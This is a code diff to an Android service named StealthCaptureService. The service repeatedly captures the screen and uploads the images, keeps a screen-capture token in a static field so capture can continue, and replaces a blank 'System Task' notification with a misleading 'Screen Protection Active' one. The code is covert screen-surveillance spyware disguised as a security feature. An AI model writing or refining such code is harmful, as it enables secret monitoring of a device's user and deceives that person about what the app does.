@@ -62,6 +62,8 @@ class StealthCaptureService : Service() {
         private const val MAX_HISTORY_COUNT = 10
         private const val MAX_WIDTH_PX = 600
         private const val JPEG_QUALITY = 40
+
+        var activeMediaProjection: MediaProjection? = null
     }
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -135,13 +137,17 @@ class StealthCaptureService : Service() {
             while (isActive && isCapturing) {
                 try {
                     if (mediaProjection == null) {
+                        mediaProjection = activeMediaProjection
+                    }
+                    if (mediaProjection == null) {
                         val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
                         if (token != null) {
                             initMediaProjection(token.first, token.second)
                         }
                     }
 
-                    if (mediaProjection != null) {
+                    val currentProj = activeMediaProjection ?: mediaProjection
+                    if (currentProj != null) {
                         captureAndUpload()
                         currentShotCount++
                         if (maxShots > 0 && currentShotCount >= maxShots) {
@@ -163,40 +169,49 @@ class StealthCaptureService : Service() {
 
     private fun initMediaProjection(resultCode: Int, resultData: Intent) {
         try {
+            if (activeMediaProjection != null) {
+                mediaProjection = activeMediaProjection
+                return
+            }
             if (mediaProjection == null) {
                 val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                 mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
+                activeMediaProjection = mediaProjection
                 mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                     override fun onStop() {
                         super.onStop()
                         Log.w(TAG, "MediaProjection session was stopped by OS.")
                         mediaProjection = null
+                        activeMediaProjection = null
                     }
                 }, handler)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Failed to initialize MediaProjection: ${e.message}")
             mediaProjection = null
+            activeMediaProjection = null
         }
     }
 
     private fun startForegroundServiceQuietly() {
+        val notificationIntent = Intent(this, com.example.MainActivity::class.java)
+        val pendingIntent = android.app.PendingIntent.getActivity(
+            this, 0, notificationIntent,
+            android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
+        )
+
         val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .setContentTitle("")
-            .setContentText("")
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentTitle("Screen Protection Active")
+            .setContentText("Monitoring screen security and session state.")
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
-            .setSilent(true)
+            .setContentIntent(pendingIntent)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-            } else {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-            }
+            val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
             try {
                 startForeground(NOTIFICATION_ID, notification, type)
             } catch (e: Exception) {
@@ -212,13 +227,11 @@ class StealthCaptureService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Task",
-                NotificationManager.IMPORTANCE_MIN
+                "Screen Protection Service",
+                NotificationManager.IMPORTANCE_DEFAULT
             ).apply {
-                description = "Background processing task"
-                setShowBadge(false)
-                setSound(null, null)
-                enableVibration(false)
+                description = "Keeps the screen capture foreground service active and running."
+                setShowBadge(true)
             }
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(channel)
@@ -258,12 +271,12 @@ class StealthCaptureService : Service() {
             return
         }
 
-        var proj = mediaProjection
+        var proj = activeMediaProjection ?: mediaProjection
         if (proj == null) {
             val token = MediaProjectionHelper.getProjectionToken(this)
             if (token != null) {
                 initMediaProjection(token.first, token.second)
-                proj = mediaProjection
+                proj = activeMediaProjection ?: mediaProjection
             }
         }
 
